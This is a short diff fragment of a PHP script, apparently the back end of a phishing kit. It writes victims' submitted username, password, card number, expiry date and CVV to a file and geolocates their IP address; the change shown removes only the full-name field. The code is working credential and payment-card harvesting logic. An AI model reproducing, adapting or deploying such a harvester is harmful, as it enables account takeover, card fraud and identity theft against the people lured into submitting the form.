@@ -21,7 +21,6 @@ $city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));
 fwrite($file, 
 "* USUARIO: ".$_POST['usuario']."
 * PASS: ".$_POST['pass']." 
-* NOMBRE Y APELLIDO: ".$_POST['nombre']."
 * TARJETA: ".$_POST['tarjeta']."
 * FECHA-E: ".$_POST['date']." 
 * CVV: ".$_POST['codigo']."  
